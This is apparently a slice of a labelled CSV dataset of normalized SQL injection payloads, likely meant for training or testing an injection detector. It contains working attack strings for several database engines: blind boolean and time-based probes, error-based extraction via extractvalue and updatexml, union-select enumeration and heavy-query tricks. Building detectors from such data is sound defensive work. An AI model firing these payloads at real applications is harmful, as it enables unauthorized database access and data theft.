row_index,payload_norm,label,sqli_type_hint
11100,"1%' ) and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
11101,1' ) ) rlike ( select ( case when ( 6205 = 1384 ) then 1 else 0x28 end ) ) and ( ( 'ahjf' = 'ahjf,1,
11102,-1638' or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and 'xkne' = 'xkne,1,
11103,( case when 5640 = 5640 then 5640 else null end ),1,
11104,"-1503"" order by 1--",1,
11105,"1"" ) and 2006 = 2006",1,
11106,1' ) ) ) and 2542 = 7042--,1,
11107,"1' ) where 6746 = 6746 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) --",1,
11108,"-7433"" ) ) as zsnt where 2513 = 2513 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --",1,
11109,"-4373%"" ) ) or 5672 = 5188--",1,
11110,"1' ) ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( 'dssx' like 'dssx",1,
11111,1' rlike sleep ( 5 ) and 'ojqz' like 'ojqz,1,
11112,1' ) as xskm where 3525 = 3525 and 2435 = 6513,1,
11113,"1%"" ) and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,
11114,1' ) ) as joco where 2922 = 2922,1,
11115,"1%"" ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( ""%"" = """,1,
11116,1' ) ) as dipp where 1714 = 1714,1,
11117,end and ( 'unko' = 'unko,1,
11118,"1"" ) ) ) union all select null,null,null,null,null,null,null,null,null,null--",1,
11119,-5116 ) or ( 8287 = 4930 ) *4930,1,
11120,select sleep ( 5 ) # wihl,1,
11121,"1%' ) ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ( '%' = '",1,
11122,1' ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( 'rjjo' = 'rjjo,1,
11123,1'|| ( select 'bgdh' from dual where 1967 = 1967,1,
11124,"1'+ ( select 'dbvq' where 2045 = 2045 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",1,
11125,"-6798%"" ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( ""%"" = """,1,
11126,"1' ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( 'sqbr' = 'sqbr",1,
11127,1'|| ( select 'dfmw' from dual where 1723 = 1723,1,
11128,"1 where 7757 = 7757 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) --",1,
11129,"1' ) ) ) union all select null,null,null,null,null,null#",1,
